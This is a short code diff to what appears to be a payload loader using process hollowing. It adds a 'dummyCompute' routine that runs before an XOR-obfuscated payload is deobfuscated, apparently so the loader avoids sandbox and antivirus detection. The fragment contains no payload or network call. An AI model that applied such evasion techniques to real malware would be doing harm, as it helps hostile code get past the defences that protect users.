@@ -30,6 +30,7 @@ Web: https://github.com/govolution/bfg
 #endif
 #ifdef PROCESS_HOLLOWING
 	#include "include/hollow.h"
+	#include "include/load_generator.h"
 #endif
 
 int get_filesize(char *fvalue);
@@ -143,6 +144,9 @@ int main (int argc, char **argv)
 	}
 	
 	#ifdef PROCESS_HOLLOWING
+		// Perform dummy computations (by default)
+		dummyCompute(1000000, keyByte0);
+	
 		#ifdef XOR_OBFUSCATION
 			// Deobfuscate payload
 			// (payloadSize, keyByte0 and payload specified in defs.h by make_bfg)
